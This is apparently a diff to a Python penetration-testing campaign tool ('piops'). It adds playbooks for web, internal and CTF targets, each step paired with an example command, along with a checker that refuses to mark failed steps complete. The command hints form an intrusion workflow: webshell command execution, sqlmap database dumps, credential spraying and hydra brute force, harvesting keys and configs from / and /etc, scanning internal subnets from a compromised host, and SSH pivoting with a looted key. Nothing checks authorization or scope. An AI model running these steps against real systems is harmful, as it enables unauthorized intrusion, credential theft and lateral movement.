@@ -53,35 +53,56 @@ CREATE TABLE IF NOT EXISTS finding(
   target TEXT, status TEXT DEFAULT 'needs-verification', evidence TEXT, created TEXT);
 """
 
+# Playbook hasil port dari peran Hephaestus (scout/anchor/strike/hunter/navigator/roaster),
+# tapi tiap langkah terikat ke gate bukti: (fase, tool, keterangan, perintah-contoh, peran)
 PLAYBOOK = {
     "web": [
-        ("recon", "fingerprint", "Identifikasi web server, framework, versi, header"),
-        ("recon", "dns-subdomain", "Enumerasi subdomain + resolve origin di balik CDN"),
-        ("recon", "port-scan", "Port terbuka + service banner"),
-        ("exposure", "path-sweep", "Sweep path rawan: .env, .git, backup, phpinfo, adminer"),
-        ("exposure", "git-dump", "Rekonstruksi .git bila ada"),
-        ("exploit", "sqli", "Uji SQLi diferensial (bukan pola error saja)"),
-        ("exploit", "upload", "Bypass upload -> webshell"),
-        ("exploit", "rce", "Eksekusi perintah / shell interaktif"),
-        ("post", "enum-host", "Enum user, sudo, cron, SUID, config rahasia"),
-        ("post", "creds", "Kumpulkan kredensial: .env, wp-config, ssh key, db dump"),
-        ("report", "writeup", "Susun laporan dengan hash bukti"),
+        ("recon", "fingerprint", "IP asli, web server, framework, versi, header", "curl -skI https://{t} | head -20", "scout"),
+        ("recon", "cohosts", "Domain lain di IP yang sama (origin di balik CDN)", "curl -s 'https://api.hackertarget.com/reverseiplookup/?q={ip}'", "scout"),
+        ("recon", "dns-subdomain", "Enumerasi subdomain", "subfinder -d {t} -silent", "scout"),
+        ("recon", "port-scan", "Port + banner", "nmap -Pn -T4 --top-ports 100 -sV {ip}", "scout"),
+        ("exposure", "path-sweep", "Path rawan: .env, .git/config, backup, phpinfo, adminer", "ffuf -u https://{t}/FUZZ -w ~/wordlists/leak.txt -mc 200", "scout"),
+        ("exposure", "git-dump", "Rekonstruksi .git bila terekspos", "webleak.py git https://{t}", "scout"),
+        ("exposure", "secret-dump", "Ambil kredensial dari .env/wp-config/JS bundle", "webleak.py secrets https://{t}", "scout"),
+        ("creds", "default-creds", "Cek kredensial default panel (2 detik, selalu dulu)", "curl -sk -o /dev/null -w '%{http_code}' https://{t}/adminer.php", "strike"),
+        ("creds", "spray", "Spray kredensial hasil dump", "smart_spray.py --target https://{t}/login --user admin", "strike"),
+        ("exploit", "cve-match", "Cocokkan versi CMS/service ke CVE, pilih vektor termurah", "nuclei -u https://{t} -tags cve -severity critical,high", "anchor"),
+        ("exploit", "sqli", "SQLi diferensial (bukan hanya pola error)", "sqlmap -u 'https://{t}/x?id=1' --batch --dbs", "anchor"),
+        ("exploit", "upload", "Bypass upload -> webshell", "autohack.py --target https://{t} --stage upload", "anchor"),
+        ("exploit", "rce", "Eksekusi perintah / shell", "curl -sk 'https://{t}/shell.php?c=id'", "anchor"),
+        ("post", "enum-host", "User, sudo, cron, SUID, kapabilitas, service", "id; uname -a; sudo -n -l; ls -la /etc/cron*", "hunter"),
+        ("post", "creds", "Kumpulkan kredensial: .env, wp-config, ssh key, db dump", "keyharvest.py --path / --out loot.json", "hunter"),
+        ("post", "internal-scan", "Scan subnet internal dari host yang sudah diakses (WAJIB)", "nmap -Pn -T4 -p 22,80,443,3306,5432,9006 <subnet>", "hunter"),
+        ("lateral", "pivot", "Pivot ke host internal / panel Proxmox", "ssh -i loot/id_rsa user@<host-internal>", "navigator"),
+        ("report", "writeup", "Laporan dari DB + sha256 bukti", "piops report {slug}", "roaster"),
     ],
     "internal": [
-        ("recon", "host-discovery", "Temukan host hidup"),
-        ("recon", "port-scan", "Port + service per host"),
-        ("exploit", "service-exploit", "Cocokkan versi service ke CVE/vektor"),
-        ("post", "creds", "Dump kredensial lokal"),
-        ("post", "lateral", "Pivot ke host berikut"),
-        ("report", "writeup", "Laporan + hash bukti"),
+        ("recon", "host-discovery", "Temukan host hidup", "nmap -sn -T4 <cidr>", "scout"),
+        ("recon", "port-scan", "Port + service per host", "nmap -Pn -T4 -sV --top-ports 100 <cidr>", "scout"),
+        ("exposure", "share-enum", "SMB/NFS/share terbuka", "nmap -p445 --script smb-enum-shares <host>", "scout"),
+        ("creds", "default-creds", "Kredensial default layanan internal", "hydra -C ~/wordlists/defaults.txt <host> ssh", "strike"),
+        ("exploit", "service-exploit", "Cocokkan versi service ke CVE", "searchsploit <service> <versi>", "anchor"),
+        ("post", "host-enum", "Enum lokal setelah akses", "id; sudo -n -l; cat /etc/passwd", "hunter"),
+        ("post", "creds", "Dump kredensial lokal (shadow, config, key)", "keyharvest.py --path /etc --out loot.json", "hunter"),
+        ("lateral", "recon-internal", "Inventory host internal + pivot", "navigator: nmap <subnet> dari host korban", "navigator"),
+        ("report", "writeup", "Laporan dari DB + hash", "piops report {slug}", "roaster"),
     ],
     "ctf": [
-        ("recon", "fingerprint", "Kenali target"),
-        ("exploit", "vuln-hunt", "Cari primitive exploit"),
-        ("exploit", "get-shell", "Dapat eksekusi"),
-        ("post", "get-flag", "Ambil flag/bukti"),
-        ("report", "writeup", "Writeup"),
+        ("recon", "fingerprint", "Kenali target", "curl -skI http://{t}", "scout"),
+        ("exploit", "vuln-hunt", "Cari primitive exploit", "nmap -Pn -sV {ip}", "anchor"),
+        ("exploit", "get-shell", "Dapat eksekusi", "autohack.py --target http://{t}", "anchor"),
+        ("post", "get-flag", "Ambil flag/bukti", "cat /flag* 2>/dev/null", "hunter"),
+        ("report", "writeup", "Writeup", "piops report {slug}", "roaster"),
     ],
+}
+
+ROLES = {
+    "scout":     "recon + intel: subdomain, cohost, fingerprint, file rawan. STOP + eskalasi bila .env/.git/config ketemu.",
+    "anchor":    "analisis vektor: cocokkan versi ke CVE, pilih jalur akses termurah, verifikasi exploit.",
+    "strike":    "kredensial: cek default dulu (2 detik), deteksi WAF, spray hasil dump.",
+    "hunter":    "post-access: enum sistem, kumpulkan kredensial, scan subnet internal (wajib).",
+    "navigator": "lateral: inventory host internal, panel Proxmox, key reuse, pivot.",
+    "roaster":   "laporan: dari DB + sha256 bukti, bukan dari ingatan.",
 }
 
 
@@ -157,12 +178,15 @@ def cmd_plan(a) -> int:
     print(f"# {camp['slug']}  target={camp['target']}  profile={camp['profile']}")
     print(f"# fase selesai (ada bukti): {', '.join(sorted(done)) or '-'}")
     n = 0
-    for phase, tool, desc in play:
+    for phase, tool, desc, hint, role in play:
         if phase in done:
             continue
         state = "ulang" if (phase, tool) in started else "belum"
         n += 1
-        print(f"{n:2d}. [{phase:8s}] {tool:16s} {state:6s}  {desc}")
+        print(f"{n:2d}. [{phase:8s}] {tool:16s} {state:6s} ({role}) {desc}")
+        if getattr(a, "verbose", False):
+            h = hint.replace("{t}", camp["target"]).replace("{ip}", camp["target"]).replace("{slug}", camp["slug"])
+            print(f"      $ {h}")
     arts = c.execute("SELECT COUNT(*) FROM artifact WHERE campaign_id=?", (camp["id"],)).fetchone()[0]
     print(f"\nartefak tercatat: {arts}")
     if n == 0:
@@ -252,6 +276,9 @@ def cmd_done(a) -> int:
         if not arts:
             fail(f"GATE: step {a.step} tidak punya artefak — status 'ok' ditolak. "
                  f"Jalankan ulang dengan 'piops run' atau daftarkan bukti: piops artifact", 3)
+        if st["exit_code"] not in (0, None):
+            fail(f"GATE: step {a.step} selesai dengan exit {st['exit_code']} — tidak boleh diakui "
+                 f"'ok'. Baca log: {st['log']}", 3)
         for art in arts:
             if not Path(art["path"]).exists():
                 fail(f"GATE: artefak hilang dari disk: {art['path']}", 3)
@@ -388,6 +415,22 @@ def cmd_scan_tools(a) -> int:
     return 0
 
 
+# ---------------------------------------------------------------- playbook
+def cmd_playbook(a) -> int:
+    for prof in ([a.profile] if a.profile else list(PLAYBOOK)):
+        print(f"# playbook: {prof}")
+        for phase, tool, desc, hint, role in PLAYBOOK[prof]:
+            print(f"  [{phase:8s}] {tool:16s} ({role}) {desc}")
+            if a.verbose:
+                print(f"      $ {hint}")
+        print()
+    if a.roles:
+        print("# peran")
+        for r, d in ROLES.items():
+            print(f"  {r:10s} {d}")
+    return 0
+
+
 # ---------------------------------------------------------------- selftest
 def cmd_selftest(a) -> int:
     """Uji gate tanpa menyentuh kampanye nyata (pakai root sementara)."""
@@ -432,6 +475,17 @@ def cmd_selftest(a) -> int:
     rc = subprocess.run([sys.executable, __file__, "done", "t", "--step", str(sid), "--status", "ok"],
                         capture_output=True, text=True, env={**os.environ, "PIOPS_ROOT": str(ROOT)})
     check("gate menerima ok dengan artefak", rc.returncode == 0)
+    # gate: exit code bukan 0 -> tolak walau ada artefak
+    cur = c.execute("INSERT INTO step(campaign_id,seq,tool,argv,phase,status,exit_code) VALUES(?,?,?,?,?,'fail',7)",
+                    (camp["id"], 2, "curl", "curl x", "exposure"))
+    sid2 = cur.lastrowid
+    c.commit()
+    f2 = cdir("t") / "artifacts" / "fail.txt"
+    f2.write_text("gagal\n", encoding="utf-8")
+    register_artifact(c, camp["id"], sid2, f2, "log")
+    rc = subprocess.run([sys.executable, __file__, "done", "t", "--step", str(sid2), "--status", "ok"],
+                        capture_output=True, text=True, env={**os.environ, "PIOPS_ROOT": str(ROOT)})
+    check("gate menolak ok pada step exit!=0", rc.returncode == 3)
     # gate: hash berubah -> tolak
     f.write_text("diubah\n", encoding="utf-8")
     rc = subprocess.run([sys.executable, __file__, "done", "t", "--step", str(sid), "--status", "ok"],
@@ -459,7 +513,14 @@ def build_parser() -> argparse.ArgumentParser:
 
     s = sub.add_parser("plan", help="langkah berikutnya")
     s.add_argument("slug")
+    s.add_argument("--verbose", action="store_true")
     s.set_defaults(func=cmd_plan)
+
+    s = sub.add_parser("playbook", help="tampilkan playbook + peran")
+    s.add_argument("--profile", default=None, choices=list(PLAYBOOK))
+    s.add_argument("--verbose", action="store_true")
+    s.add_argument("--roles", action="store_true")
+    s.set_defaults(func=cmd_playbook)
 
     s = sub.add_parser("run", help="jalankan tool + catat bukti")
     s.add_argument("slug")
